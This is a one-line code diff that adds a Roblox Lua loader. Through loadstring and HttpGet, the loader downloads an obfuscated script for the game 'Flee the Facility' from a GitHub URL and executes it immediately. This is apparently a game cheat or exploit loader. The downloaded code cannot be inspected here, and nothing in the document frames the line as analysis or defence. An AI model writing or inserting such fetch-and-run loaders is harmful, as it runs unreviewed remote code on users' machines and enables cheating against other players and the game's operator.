@@ -1,0 +1,1 @@
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/pantheon111/ftf/main/flee_the_facility_obfuscated.lua"))()
